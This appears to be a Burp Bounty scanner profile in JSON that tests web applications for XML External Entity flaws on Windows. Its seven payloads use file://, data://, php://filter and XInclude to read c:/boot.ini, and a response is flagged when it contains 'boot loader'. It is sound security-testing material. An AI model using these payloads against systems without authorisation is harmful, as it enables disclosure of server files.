[
  {
    "ProfileName": "XXE_Windows",
    "Name": "",
    "Enabled": true,
    "Scanner": 1,
    "Author": "@burpbounty",
    "Payloads": [
      "true,\u003c?xml version\u003d\"1.0\" encoding\u003d\"ISO-8859-1\"?\u003e\u003c!DOCTYPE foo [\u003c!ELEMENT foo ANY\u003e\u003c!ENTITY xxe SYSTEM \"file:///c:/boot.ini\"\u003e]\u003e\u003cfoo\u003e\u0026xxe;\u003c/foo\u003e",
      "true,\u003c?xml version\u003d\"1.0\" encoding\u003d\"ISO-8859-1\"?\u003e\u003c!DOCTYPE foo [ \u003c!ENTITY % xxe SYSTEM \"data://text/plain;base64,ZmlsZTovLy9jOi9ib290LmluaQ\u003d\u003d\"\u003e]\u003e\u003cfoo\u003e\u0026xxe;\u003c/foo\u003e",
      "true,\u003c?xml version\u003d\"1.0\" encoding\u003d\"ISO-8859-1\"?\u003e\u003c!DOCTYPE foo [\u003c!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource\u003dc:/boot.ini\"\u003e]\u003e\u003cfoo\u003e\u0026xxe;\u003c/foo\u003e",
      "true,\u003c?xml version\u003d\"1.0\"?\u003e\u003c!DOCTYPE foo [\u003c!ELEMENT foo ANY\u003e\u003c!ENTITY xxe SYSTEM \"file:///c:/boot.ini\"\u003e]\u003e\u003cfoo\u003e\u0026xxe;\u003c/foo\u003e",
      "true,\u003c?xml version\u003d\"1.0\"?\u003e\u003c!DOCTYPE foo [ \u003c!ENTITY % xxe SYSTEM \"data://text/plain;base64,ZmlsZTovLy9jOi9ib290LmluaQ\u003d\u003d\"\u003e]\u003e\u003cfoo\u003e\u0026xxe;\u003c/foo\u003e",
      "true,\u003c?xml version\u003d\"1.0\"?\u003e\u003c!DOCTYPE foo [\u003c!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource\u003dc:/boot.ini\"\u003e]\u003e\u003cfoo\u003e\u0026xxe;\u003c/foo\u003e",
      "true,\u003cfoo xmlns:xi\u003d\"http://www.w3.org/2001/XInclude\"\u003e\u003cxi:include parse\u003d\"text\" href\u003d\"file:///c:/boot.ini\"/\u003e\u003c/foo\u003e"
    ],
    "Encoder": [],
    "UrlEncode": false,
    "CharsToUrlEncode": "",
    "Grep": [
      "true,,boot loader"
    ],
    "Tags": [
      "All",
      "XXE"
    ],
    "PayloadResponse": false,
    "NotResponse": false,
    "TimeOut1": "",
    "TimeOut2": "",
    "isTime": false,
    "contentLength": "",
    "iscontentLength": false,
    "CaseSensitive": false,
    "ExcludeHTTP": true,
    "OnlyHTTP": false,
    "IsContentType": false,
    "ContentType": "",
    "HttpResponseCode": "",
    "NegativeCT": false,
    "IsResponseCode": false,
    "ResponseCode": "",
    "NegativeRC": false,
    "urlextension": "",
    "isurlextension": false,
    "NegativeUrlExtension": false,
    "isHeaderValue": false,
    "sequence": false,
    "NewHeaders": [],
    "MatchType": 1,
    "Scope": 0,
    "RedirType": 4,
    "MaxRedir": 5,
    "requestType": 1,
    "rawRequest": "",
    "payloadPosition": 1,
    "payloadsFile": "",
    "grepsFile": "",
    "IssueName": "XXE_Windows",
    "IssueSeverity": "High",
    "IssueConfidence": "Certain",
    "IssueDetail": "\n\n\u003cbr/\u003e\u003cbr/\u003e- PAYLOAD: \u003cbr/\u003e\u003cpayload\u003e\n\u003cbr/\u003e\u003cbr/\u003e\n- GREP: \u003cbr/\u003e\u003cgrep\u003e",
    "RemediationDetail": "",
    "IssueBackground": "",
    "RemediationBackground": "",
    "Header": [],
    "VariationAttributes": [],
    "InsertionPointType": [
      64,
      36
    ],
    "Scanas": false,
    "Scantype": 0,
    "pathDiscovery": false,
    "changeHttpRequest": false,
    "showIssue": false,
    "changeHttpRequestType": 1
  }
]